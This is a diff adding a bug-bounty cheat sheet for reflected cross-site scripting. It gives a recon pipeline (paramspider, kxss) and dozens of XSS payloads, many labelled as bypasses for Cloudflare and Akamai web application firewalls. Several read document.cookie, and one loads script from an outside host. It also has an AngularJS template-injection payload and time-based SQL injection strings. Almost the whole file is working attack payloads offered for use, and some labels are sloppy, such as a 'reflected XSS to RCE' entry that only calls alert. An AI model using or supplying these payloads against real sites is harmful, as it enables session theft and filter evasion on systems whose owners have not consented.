@@ -1,0 +1,125 @@
+Quick tip to find reflected xss:
+
+1- python3 http://paramspider.py --domain http://domian.com
+
+2- cat http://domain.com.txt | kxss | grep "< >" | tee unfiltered_param.txt 
+
+3- inject simple xss payload:
+
+"><img src=x onerror=alert("XSS")>
+—————————————————-
+Payloads 💰 
+
+<style>
+@keyframes
+ a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
+
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+
+<d3v/onauxclick=[2].some(confirm)>click
+
+<x onauxclick=a=alert,a(domain)>click
+
+q=1" type=image sr>c<=x one>ror<="alert> (alert')
+
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+
+(Chrome only)
+
+?id=1&id=2
+⬇️
+<input value="1,2">
+
+?id="&id=onpointerrawupdate="a=confirm&id=a(1)
+⬇️
+<input value="", onpointerrawupdate="a=confirm, a(1)">
+
+Payload:
+%3Cmarquee%20loop=1%20width=%271%26apos;%27onfinish=self[`al`+`ert`](1)%3E%23leet%3C/marquee%3E
+
+FOR CHROME:
+%3Cx%20y=1%20z=%271%26apos;%27onclick=self[`al`%2B`ert`](1)%3E%23CLICK%20MEE
+
+Akamai XSS Bypass:
+
+Cloudflare XSS Bypass: <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+
+</ScRiPt><img src=something onauxclick="new Function `al\ert\`xss\``">
+
+"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
+
+link=qwe"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>
+
+javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><hvita onbeforetoggle="+a+b+c+" popover id=x>Hvita</hvita>")
+
+Angular 1.4.3 CSTI XSS Akamai WAF:
+
+{{([].toString()).constructor.prototype.charAt=[].join;$eval(([].toString()).constructor.fromCodePoint([120],[61],[49],[125],[125],[125],[59],[97],[108],[101],[114],[116],[40],[49],[41],[47],[47]));}}
+
+<details open ontoggle="{alert`1`}"></details>
+
+Cloudflare WAF Bypass - XSS
+(Still works - when only=1 didn’t)
+
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+
+Midnight hunting 
+payload: \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
+
+Payload: <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==")> 
+
+Reflected Cross-Site Scripting (XSS) and HTML Injection
+
+## Vulnerable url :- https[:]//exampledesk[.]example[.]com/helpdesk/logon.asp?URL=%22%3E%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+## Vulnerable Paramter :- URL=
+
+## Payload :- "></script><script>alert(document.cookie)</script>
+
+Yet Another Cloudflare WAF Bypass - #XSS
+
+<a"/onclick=(confirm)(origin)>Click Here!
+
+Worked for me yesterday, quite well.
+
+Another sql injection payload: 
+14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515
+
+reflected XSS to RCE 
+
+Payload: "><img src=x onerror=alert(whoami)>
+
+Cloudflare WAF Bypass ⚡️
+
+<a"/onclick=(confirm)(origin)>Click Here!
+
+Time sleep sql injection ⚡️
+
+Payload: 'XOR(if(now()=sysdate(),sleep(33),0))OR'
+
+🔖Akamai XSS WAF Bypass
+
+( src,svg,autofocus,iframe,img,<> )
+
+You use this payload
+
+%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22
+
+CloudFlare Bypass [XSS]
+
+Payload : 
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+
+onscrollend payload for Chrome and Firefox
+
+<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:50px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
+
+XSS-Bypass Anatomy
+
+Final payload after working hours on a bug bounty target w/ both XSS filters & WAF:
+
+%0Ajavascript%3Ato%0ap%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%0A/%0A/%0A
+
+<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
